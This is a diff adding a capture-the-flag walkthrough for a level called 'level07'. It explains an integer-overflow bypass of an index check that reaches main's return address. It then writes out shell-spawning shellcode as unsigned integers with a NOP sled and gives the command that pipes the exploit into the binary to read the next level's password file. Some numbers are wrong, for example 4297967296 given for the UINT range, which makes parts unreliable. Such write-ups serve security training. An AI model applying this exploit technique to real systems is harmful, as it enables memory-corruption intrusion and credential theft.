@@ -1,0 +1,50 @@
+- we can store unsigned integers into the stack thanks to this program
+- we can go from data to main return address using the correct idx
+- idx operates on an unsigned int array so it jumps 4 stack address
+when it is incremented
+
+	0 -> data
+	100 -> ret
+	101 -> entry
+	106 -> canary
+	107 -> 12 bytes of stack alignment
+	110 -> 3 saved registers
+	113 -> saved ebp
+	114 -> main return address
+
+- main return address can be accessed with an idx of 114 but it is
+a "reserved" address (it is a 3 multiple) so we can't write to it
+directly
+- idx is multiplied by 4 before being added to data address so
+we can overflow that value to fulfil the reserved address test
+
+- 4297967296 (number of values in an UINT) / 4 = 1073741824
+- we just have to add 1073741824 to our restricted indexes to skew the test
+- we can reach the main return address with idx = 1073741938
+
+- now that we can reach this address, we also can introduce a shellcode
+into the stack in upper addresses
+- we have to convert that shellcode into unsigned int values that we'll
+be stored right upper the return address
+
+	0x31c05068 -> 1750122545
+	0x2f2f7368 -> 1752379183
+	0x682f6269 -> 1768042344
+	0x6eb00b89 -> 2299244654
+	0xe331c931 -> 835269091
+	0xd2cd8000 -> 8441298
+
+- we will of course prepend that shellcode with a NOP field big enough
+to compensate the variations of addresses compared to gdb results
+	0x90909090 -> 2425393296
+
+- last information we need is the shellcode offset, it is 4 bytes above
+the main return address and gdb can give us an address for it
+	- ebp @ 0xffffd708
+	- shellcode @ 0xffffd708 + 0x4 + 0x40 (the middle of NOP field) = 0xffffd74c
+	-> 4294956876
+
+- we can now make a script to do the (remaining) hard work for us, copy it into
+/tmp/exploit.rb and then run it
+	- (/tmp/exploit.rb; cat) | ./level07
+	- cat /home/users/level08/.pass
